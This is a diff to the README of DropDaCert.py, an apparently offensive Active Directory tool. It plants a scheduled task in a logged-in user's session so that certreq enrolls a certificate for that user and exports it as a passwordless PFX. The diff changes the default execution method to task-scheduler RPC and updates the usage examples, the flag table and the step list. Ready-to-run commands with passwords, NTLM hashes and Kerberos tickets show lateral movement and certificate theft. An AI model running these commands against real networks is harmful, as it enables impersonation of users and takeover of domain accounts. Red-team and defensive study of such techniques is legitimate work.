@@ -12,8 +12,8 @@ Drops a scheduled task on a target that runs in an active user's session context
 
   [+] Resolving target: 10.0.0.5
   [+] Target: SRV01.corp.local (10.0.0.5)
-  [+] Connecting via WinRM (NTLM)...
-  [+] Connected
+  [+] Connecting via SMB...
+  [+] Enumerating sessions via RPC...
 
   #    State    Session              User
   ---- -------- -------------------- ------------------------------
@@ -80,11 +80,11 @@ python3 DropDaCert.py corp.local/admin:'Pass'@server01 -k -ca 'CA01\CA' -dc 10.0
 export KRB5CCNAME=admin.ccache
 python3 DropDaCert.py corp.local/admin@server01 -k -ca 'CA01\CA' -dc 10.0.0.1
 
-# SMB exec (no WinRM needed)
-python3 DropDaCert.py admin:'Pass'@target -ca 'CA01\CA' -dc 10.0.0.1 --exec-method smb
+# WinRM exec (if WinRM is available)
+python3 DropDaCert.py admin:'Pass'@target -ca 'CA01\CA' -dc 10.0.0.1 --exec-method winrm
 
-# TSCH RPC exec (no WinRM, no service binary — just SMB + task scheduler RPC)
-python3 DropDaCert.py admin:'Pass'@target -ca 'CA01\CA' -dc 10.0.0.1 --exec-method tsch
+# SMB exec (drops psexecsvc service binary)
+python3 DropDaCert.py admin:'Pass'@target -ca 'CA01\CA' -dc 10.0.0.1 --exec-method smb
 
 # Manual mode — generate files and print instructions only
 python3 DropDaCert.py admin@target -ca 'CA01\CA' -dc 10.0.0.1 --exec-method manual -tu jsmith
@@ -104,7 +104,7 @@ python3 DropDaCert.py admin:'Pass'@target -ca 'CA01\CA' -dc 10.0.0.1 -tu lowpriv
 | `-H [LM:]NT` | NTLM hash |
 | `-k` | Kerberos auth |
 | `--aes-key HEX` | AES key for Kerberos |
-| `--exec-method` | `winrm` (default), `smb`, `tsch`, `manual` |
+| `--exec-method` | `tsch` (default), `winrm`, `smb`, `manual` |
 | `--exec-wrapper` | `conhost` (default), `cmd`, `powershell`, `wscript` |
 | `--drop-dir` | Remote drop directory (default: `C:\Windows\Tasks`) |
 | `--template` | Certificate template (default: `User`) |
@@ -114,8 +114,8 @@ python3 DropDaCert.py admin:'Pass'@target -ca 'CA01\CA' -dc 10.0.0.1 -tu lowpriv
 
 ## How it works
 
-1. Connects via WinRM (default), SMB (psexecsvc), or TSCH (direct task scheduler RPC)
-2. Enumerates active sessions (WMI for WinRM/SMB, WKSSVC RPC for TSCH)
+1. Connects via TSCH (default, task scheduler RPC over port 445), WinRM, or SMB (psexecsvc)
+2. Enumerates active sessions (WKSSVC RPC for TSCH, WMI for WinRM/SMB)
 3. Uploads `cert.inf` and `cert.bat` via SMB
 4. Creates scheduled task — runs in the target user's session context
 5. `cert.bat` runs `certreq` to enroll, exports PFX with empty password
